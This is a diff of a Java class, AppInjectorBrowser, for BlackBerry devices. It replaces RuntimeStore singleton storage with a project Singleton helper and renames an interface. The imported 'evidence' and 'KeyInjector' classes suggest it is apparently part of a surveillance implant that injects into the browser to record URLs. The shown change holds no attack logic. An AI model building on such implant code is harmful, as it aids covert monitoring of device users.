@@ -9,19 +9,19 @@
 
 package blackberry.module.url;
 
-import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Singleton;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjectorInterface;
 import blackberry.injection.KeyInjector;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
-public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
+public class AppInjectorBrowser implements AppInjectorInterface, iSingleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
     //#endif
@@ -39,12 +39,12 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     public static synchronized AppInjectorBrowser getInstance() {
         if (instance == null) {
-            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
+            instance = (AppInjectorBrowser) Singleton.self().get(
                     GUID);
             if (instance == null) {
                 final AppInjectorBrowser singleton = new AppInjectorBrowser();
 
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
